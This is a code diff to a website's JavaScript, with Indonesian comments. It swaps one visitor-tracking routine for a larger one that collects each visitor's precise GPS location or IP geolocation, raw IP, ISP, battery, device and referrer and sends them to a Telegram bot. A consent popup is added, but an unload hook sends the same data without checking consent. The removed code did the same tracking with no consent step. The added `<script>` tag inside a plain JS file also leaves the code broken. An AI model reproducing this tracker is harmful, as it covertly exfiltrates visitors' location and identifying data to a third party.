@@ -171,57 +171,344 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   }, 1000);
 });
 
-// === INFO PENGUNJUNG ===
-async function showVisitorInfo() {
-  const savedUser = localStorage.getItem("ig_user") || "Anonim";
-  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
+<script>
+/*
+  Visitor notifier — "GG" upgrade
+  - Ganti BOT_TOKEN dan CHAT_ID
+  - Opsi: anonymizeIP, dedupeMinutes, useReverseGeocode (may call external API)
+*/
+
+const BOT_TOKEN = "PASTE_BOT_TOKEN_HERE";
+const CHAT_ID = "PASTE_CHAT_ID_HERE";
+
+const GG_OPTIONS = {
+  dedupeMinutes: 10,            // jangan kirim lebih dari sekali tiap X menit
+  anonymizeIP: false,           // true = kirim hashed IP instead of raw
+  sendOnUnload: true,           // coba gunakan navigator.sendBeacon saat tab ditutup
+  tryReverseGeocode: false,     // jika true, akan request reverse geocode (may be rate-limited)
+  ipApiUrls: [                  // fallback ip geolocation services (first working wins)
+    "https://ipwho.is/",
+    "https://ipapi.co/json/",
+    "https://ipinfo.io/json?token=" // add token if available
+  ],
+  telegramApiBase: `https://api.telegram.org/bot${BOT_TOKEN}`,
+};
+
+function nowISO() { return new Date().toISOString(); }
+
+async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function sha256hex(str) {
+  const enc = new TextEncoder().encode(str);
+  const hash = await crypto.subtle.digest("SHA-256", enc);
+  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+function shouldDedupe() {
+  try {
+    const last = localStorage.getItem("gg_last_send");
+    if (!last) return true;
+    const lastTime = new Date(last).getTime();
+    return (Date.now() - lastTime) / 60000 >= GG_OPTIONS.dedupeMinutes;
+  } catch { return true; }
+}
+function markSent() {
+  try { localStorage.setItem("gg_last_send", new Date().toISOString()); } catch {}
+}
+
+function formatMeters(m) {
+  if (m == null) return "";
+  if (m < 1) return `${(m*100).toFixed(0)} cm`;
+  if (m < 1000) return `${Math.round(m)} m`;
+  return `${(m/1000).toFixed(2)} km`;
+}
+
+async function tryIpProviders() {
+  for (const url of GG_OPTIONS.ipApiUrls) {
     try {
-      const now = new Date();
-      const mapLink = (latitude && longitude)
-        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
-        : "https://www.google.com/maps";
-      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
-      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
-        /Android/i.test(navigator.userAgent) ? "Android" :
-        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
-        /Mac/i.test(navigator.userAgent) ? "MacOS" :
-        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
-      let batteryInfo = "Tidak diketahui";
-      try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
-      } catch {}
-      const msg = `📢 Pengunjung Baru!
-👤 ${savedUser}
-🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
-🗺️ Maps: ${mapLink}
-📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
-💻 ${device}
-🧩 OS: ${os}
-🔋 Baterai: ${batteryInfo}
-🏷️ ISP: ${d.connection?.isp || d.org || "?"}
-📡 IP: ${d.ip || "?"}
-🕓 ${now.toLocaleString('id-ID')}`;
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      const res = await fetch(url, {cache: "no-store"});
+      if (!res.ok) continue;
+      const json = await res.json();
+      // normalize fields
+      if (!json.ip && json.ip_address) json.ip = json.ip_address;
+      return json;
+    } catch (e) { /* continue */ }
+  }
+  return null;
+}
+
+async function reverseGeocode(lat, lon) {
+  // optional: uses Nominatim (be mindful of rate limits). Disabled by default.
+  try {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&zoom=10&addressdetails=1`;
+    const r = await fetch(url, { headers: { "User-Agent":"gg-visitor-script/1.0 (contact)" } });
+    if (!r.ok) return null;
+    return await r.json();
+  } catch { return null; }
+}
+
+function buildTelegramMessage(payload) {
+  // Use HTML parse_mode for clarity
+  const {
+    username = "Anonim",
+    source = "?",
+    lat, lon, accuracy,
+    ipDisplay,
+    device, os, battery, isp, ip,
+    tz, lang, screen, referrer, utm
+  } = payload;
+
+  const mapLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}&z=17` : "https://www.google.com/maps";
+  const locLine = lat && lon ? `${lat.toFixed(6)}, ${lon.toFixed(6)} (<a href="${mapLink}">map</a>)` : "Tidak tersedia";
+
+  let text = `<b>📣 Pengunjung Baru — GG</b>\n`;
+  text += `<b>👤</b> ${escapeHtml(username)}\n`;
+  text += `<b>📍 Lokasi:</b> ${locLine}\n`;
+  text += `<b>📡 Sumber:</b> ${escapeHtml(source)}${accuracy ? ` (±${formatMeters(accuracy)})` : ""}\n`;
+  text += `<b>💻 Device:</b> ${escapeHtml(device)} — ${escapeHtml(os)}\n`;
+  text += `<b>🔋 Baterai:</b> ${escapeHtml(battery || "Tidak diketahui")}\n`;
+  text += `<b>🏷️ ISP:</b> ${escapeHtml(isp || "-")}\n`;
+  text += `<b>🔗 Referrer:</b> ${escapeHtml(referrer || "-")}\n`;
+  if (utm) text += `<b>🏷️ UTM:</b> ${escapeHtml(JSON.stringify(utm))}\n`;
+  text += `<b>🕓</b> ${escapeHtml(new Date().toLocaleString('id-ID'))} (${escapeHtml(tz || "-")})\n`;
+  text += `<b>🌐 IP:</b> ${escapeHtml(ipDisplay || "-")}\n`;
+  text += `<b>🖥️ Screen:</b> ${escapeHtml(screen)}\n`;
+  text += `<b>🗣️ Lang:</b> ${escapeHtml(lang || "-")}\n`;
+  text += `\n<i>id:${escapeHtml(window.location.hostname)} url:${escapeHtml(window.location.pathname)}</i>`;
+  return text;
+}
+
+function escapeHtml(unsafe) {
+  if (unsafe == null) return "";
+  return String(unsafe)
+    .replaceAll("&", "&amp;")
+    .replaceAll("<", "&lt;")
+    .replaceAll(">", "&gt;");
+}
+
+async function sendToTelegram(payload, useBeacon = false) {
+  const text = buildTelegramMessage(payload);
+  const body = { chat_id: CHAT_ID, text, parse_mode: "HTML", disable_web_page_preview: true };
+  const url = `${GG_OPTIONS.telegramApiBase}/sendMessage`;
+
+  async function doFetch(attempt = 0) {
+    try {
+      const res = await fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        body: JSON.stringify(body),
       });
-    } catch (err) { console.error("❌ Gagal kirim info:", err); }
+      if (!res.ok) throw new Error("Telegram API error");
+      markSent();
+      return true;
+    } catch (err) {
+      if (attempt < 4) {
+        await sleep(500 * Math.pow(2, attempt)); // exponential backoff
+        return await doFetch(attempt + 1);
+      }
+      console.error("Gagal kirim pesan ke Telegram:", err);
+      return false;
+    }
   }
-  try {
-    const coords = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
-    });
-    const { latitude, longitude, accuracy } = coords.coords;
-    const ipData = await (await fetch("https://ipwho.is/")).json();
-    await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
-  } catch {
-    const d = await (await fetch("https://ipwho.is/")).json();
-    await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
+
+  if (useBeacon && navigator.sendBeacon) {
+    try {
+      const blob = new Blob([JSON.stringify(body)], { type: "application/json" });
+      const ok = navigator.sendBeacon(url, blob);
+      if (ok) { markSent(); return true; }
+      // fallback to fetch if beacon didn't work
+    } catch (e) { /* ignore */ }
   }
+  return await doFetch();
 }
-showVisitorInfo();
+
+function readStoredUser() {
+  try {
+    return localStorage.getItem("ig_user") || "Anonim";
+  } catch { return "Anonim"; }
+}
+
+function parseUTM() {
+  try {
+    const url = new URL(window.location.href);
+    const utm = {};
+    for (const k of ["utm_source","utm_medium","utm_campaign","utm_term","utm_content"]) {
+      if (url.searchParams.has(k)) utm[k] = url.searchParams.get(k);
+    }
+    return Object.keys(utm).length ? utm : null;
+  } catch { return null; }
+}
+
+async function getBatteryInfo() {
+  try {
+    const b = await navigator.getBattery();
+    return `${(b.level * 100).toFixed(0)}% (${b.charging ? "⚡" : "🔋"})`;
+  } catch { return null; }
+}
+
+async function gatherAndSend({useBeacon = false} = {}) {
+  if (!shouldDedupe()) { console.log("Deduped: recently sent"); return; }
+
+  const username = readStoredUser();
+  const lang = navigator.language || navigator.userLanguage || null;
+  const screenInfo = `${screen.width}x${screen.height}@${window.devicePixelRatio || 1}`;
+  const referrer = document.referrer || null;
+  const utm = parseUTM();
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
+  const device = /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+  const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
+             /Android/i.test(navigator.userAgent) ? "Android" :
+             /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+             /Mac/i.test(navigator.userAgent) ? "MacOS" :
+             /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+
+  const battery = await getBatteryInfo();
+
+  // First try real geolocation (if allowed). Use Permissions API for nicer flow.
+  let lat, lon, accuracy, source = "Unknown";
+  try {
+    if (navigator.permissions) {
+      const p = await navigator.permissions.query({ name: "geolocation" });
+      if (p.state === "granted" || p.state === "prompt") {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 })
+        );
+        lat = pos.coords.latitude;
+        lon = pos.coords.longitude;
+        accuracy = pos.coords.accuracy;
+        source = "GPS HighAccuracy";
+      }
+    } else {
+      // if no permissions API, still try geolocation once
+      const pos = await new Promise((res, rej) =>
+        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 })
+      );
+      lat = pos.coords.latitude;
+      lon = pos.coords.longitude;
+      accuracy = pos.coords.accuracy;
+      source = "GPS HighAccuracy";
+    }
+  } catch (e) {
+    // geolocation failed/denied → try IP providers
+    const ipdata = await tryIpProviders();
+    if (ipdata) {
+      // Normalize possible fields
+      lat = ipdata.latitude || ipdata.lat || null;
+      lon = ipdata.longitude || ipdata.lon || null;
+      accuracy = null;
+      source = ipdata.ip ? "IP-based" : "IP-provider";
+    }
+  }
+
+  // optional reverse geocode
+  let humanPlace = null;
+  if (GG_OPTIONS.tryReverseGeocode && lat && lon) {
+    try {
+      const rev = await reverseGeocode(lat, lon);
+      if (rev && rev.address) humanPlace = rev.display_name || null;
+    } catch {}
+  }
+
+  // IP handling
+  let ipRaw = null;
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json", {cache: "no-store"});
+    if (ipRes.ok) {
+      const j = await ipRes.json();
+      ipRaw = j.ip;
+    }
+  } catch {}
+
+  let ipDisplay = ipRaw || null;
+  if (GG_OPTIONS.anonymizeIP && ipRaw) {
+    try {
+      ipDisplay = await sha256hex(ipRaw).then(h => h.slice(0, 16) + "...(hash)");
+    } catch {}
+  }
+
+  // ISP/Org: try previously-fetched ip provider for more data
+  let isp = null;
+  try {
+    const ipInfo = await tryIpProviders();
+    if (ipInfo && (ipInfo.isp || ipInfo.org || ipInfo.company || ipInfo.hostname)) {
+      isp = ipInfo.isp || ipInfo.org || (ipInfo.company && ipInfo.company.name) || ipInfo.hostname;
+    }
+  } catch {}
+
+  const payload = {
+    username,
+    source,
+    lat, lon, accuracy,
+    ipDisplay,
+    device, os, battery, isp, ip: ipRaw,
+    tz, lang, screen: screenInfo, referrer, utm,
+    place: humanPlace
+  };
+
+  await sendToTelegram(payload, useBeacon);
+}
+
+// Consent modal (simple)
+function showConsentModal() {
+  return new Promise((resolve) => {
+    try {
+      const consentKey = "gg_consent_v1";
+      if (localStorage.getItem(consentKey) === "granted") return resolve(true);
+
+      // build simple modal
+      const modal = document.createElement("div");
+      Object.assign(modal.style, {
+        position: "fixed", inset: "0", display: "flex", alignItems: "center",
+        justifyContent: "center", background: "rgba(0,0,0,0.6)", zIndex: 999999
+      });
+      modal.innerHTML = `
+        <div style="max-width:420px;background:#fff;padding:18px;border-radius:10px;font-family:Arial">
+          <h3 style="margin:0 0 8px">Izinkan pengiriman info pengunjung?</h3>
+          <p style="margin:0 0 14px;font-size:14px;color:#333">
+            Kami akan mengirim data lokasi (jika diizinkan), IP (atau hash jika pilih anonymize), device, dan waktu ke Telegram.
+            Ini untuk monitoring akses. Klik <b>Setuju</b> untuk melanjutkan atau <b>Tidak</b> untuk menolak.
+          </p>
+          <div style="display:flex;gap:8px;justify-content:flex-end">
+            <button id="gg_decline" style="padding:8px 12px;border-radius:6px;border:1px solid #ccc;background:#fff">Tidak</button>
+            <button id="gg_accept" style="padding:8px 12px;border-radius:6px;border:0;background:#2563eb;color:white">Setuju</button>
+          </div>
+        </div>
+      `;
+      document.body.appendChild(modal);
+      modal.querySelector("#gg_accept").onclick = () => {
+        try { localStorage.setItem(consentKey, "granted"); } catch {}
+        modal.remove(); resolve(true);
+      };
+      modal.querySelector("#gg_decline").onclick = () => { modal.remove(); resolve(false); };
+    } catch (e) { resolve(false); }
+  });
+}
+
+// Hook unload to try send via beacon (if enabled)
+if (GG_OPTIONS.sendOnUnload) {
+  window.addEventListener("unload", async () => {
+    // Best-effort: if we haven't sent recently, try to send using Beacon
+    if (shouldDedupe()) {
+      await gatherAndSend({useBeacon: true});
+    }
+  }, {passive: true});
+}
+
+// Entrypoint — run immediately (consent required)
+(async function main() {
+  try {
+    const allow = await showConsentModal();
+    if (!allow) {
+      console.log("User declined visitor reporting.");
+      return;
+    }
+    // run now
+    await gatherAndSend({useBeacon: false});
+  } catch (e) {
+    console.error("GG script error:", e);
+  }
+})();
+</script>
 
 // === EFEK BUTTERFLY 💸 ===
 (function () {
